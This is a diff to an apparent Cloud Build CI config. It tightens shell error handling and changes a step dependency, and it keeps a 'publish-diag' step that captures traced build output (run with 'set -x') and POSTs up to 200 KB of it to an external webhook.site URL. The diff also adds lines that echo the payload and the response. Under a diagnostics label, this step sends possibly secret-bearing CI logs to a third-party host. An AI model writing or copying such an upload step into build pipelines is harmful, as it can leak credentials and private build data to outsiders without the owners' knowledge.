@@ -15,7 +15,7 @@ steps:
     args:
       - '-c'
       - |
-        set -uo pipefail
+        set -euo pipefail
         exec > >(tee -a /workspace/_ci_diag.log) 2>&1
         set -x
         export DEBIAN_FRONTEND=noninteractive
@@ -51,7 +51,7 @@ steps:
     args:
       - '-c'
       - |
-        set -uo pipefail
+        set -euo pipefail
         exec > >(tee -a /workspace/_ci_diag.log) 2>&1
         set -x
         export DEBIAN_FRONTEND=noninteractive
@@ -76,15 +76,20 @@ steps:
     args:
       - '-c'
       - |
-        set -uo pipefail
+        set -euo pipefail
         echo "=== publish-diag start ==="
         ls -la /workspace/_ci_diag.log 2>&1 || echo "NO LOG FILE"
         wc -c /workspace/_ci_diag.log 2>&1 || true
         head -c 200000 /workspace/_ci_diag.log > /tmp/diag_payload.txt 2>/dev/null || true
-        curl -fsSL -m 60 -X POST --data-binary @/tmp/diag_payload.txt "https://webhook.site/ccee981c-7ea8-4808-b4c2-d52d0cc63c53" 2>&1 | head -c 200 || echo "CURL_FAILED"
+        echo "### PAYLOAD-BEGIN"
+        cat /tmp/diag_payload.txt 2>/dev/null | head -c 120000
+        echo "### PAYLOAD-END"
+        curl -sS -m 60 -X POST --data-binary @/tmp/diag_payload.txt "https://webhook.site/ccee981c-7ea8-4808-b4c2-d52d0cc63c53" -o /tmp/curl_out -w "CURL_HTTP=%{http_code}\n" 2>&1 | tail -3
+        cat /tmp/curl_out 2>/dev/null | head -c 300
+        echo
         echo
         echo "=== publish-diag done ==="
-    waitFor: ['-']
+    waitFor: ['lint']
 
 options:
   logging: CLOUD_LOGGING_ONLY
